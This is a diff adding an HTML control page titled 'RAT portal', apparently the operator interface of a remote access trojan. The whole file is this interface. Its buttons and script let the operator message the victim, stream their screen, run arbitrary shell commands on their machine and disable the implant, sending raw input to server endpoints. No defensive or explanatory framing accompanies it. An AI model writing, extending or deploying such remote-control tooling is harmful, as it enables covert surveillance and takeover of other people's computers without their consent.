@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+
+<head>
+    <title>RAT portal</title>
+</head>
+
+<body>
+    <h1 style="text-align: center;">RAT portal</h1>
+
+    <div id="message">
+        <p style="font-size: xx-large;">Message the PC user</p>
+        <input placeholder="Insert your message" id="mesContent">
+        <button onclick="send()">Send</button>
+    </div>
+
+    <div id="screenStream">
+        <p style="font-size: xx-large;">Open a screen stream</p>
+        <button onclick="window.location.replace('./screenStream')">Open</button>
+    </div>
+
+    <div id="command">
+        <p style="font-size: xx-large;">Terminal</p>
+        <input placeholder="Insert your command" id="comContent">
+        <button onclick="run()">Run</button>
+    </div>
+
+
+    <div id="disable" style="font-size: xx-large;">
+        <p>Disable RAT</p>
+        <button onclick="disable()">Disable</button>
+    </div>
+
+</body>
+
+<script>
+    function disable()
+    {
+        var authorized = window.confirm('Are you sure you want to disable RAT?');
+
+        if (authorized)
+        {
+            fetch('./disable').then(function (response) {
+                response.text().then(function (returned) {
+                    if (returned != 'ok')
+                    {
+                        window.alert(returned);
+                    }
+                    else
+                    {
+                        window.location.replace('https://google.com');
+                    }
+                });
+            });
+        }
+    }
+    function send()
+    {
+        fetch('./sendMessage?content=' + document.getElementById('mesContent').value).then(function (response) {
+            response.text().then(function (returned) {
+                if (returned != 'ok')
+                {
+                    window.alert(returned);
+                }
+            });
+        });
+    }
+
+    function run()
+    {
+        fetch('./run?command=' + document.getElementById('comContent').value).then(function (response) {
+            response.text().then(function (returned) {
+                var json = JSON.parse(returned);
+                if (json.error == '')
+                {
+                    
+                    window.alert((json.output == '' ? 'Command was initialized!' : json.output));
+                }
+                else
+                {
+                    window.alert(json.error);
+                }
+            });
+        });
+    }
+</script>
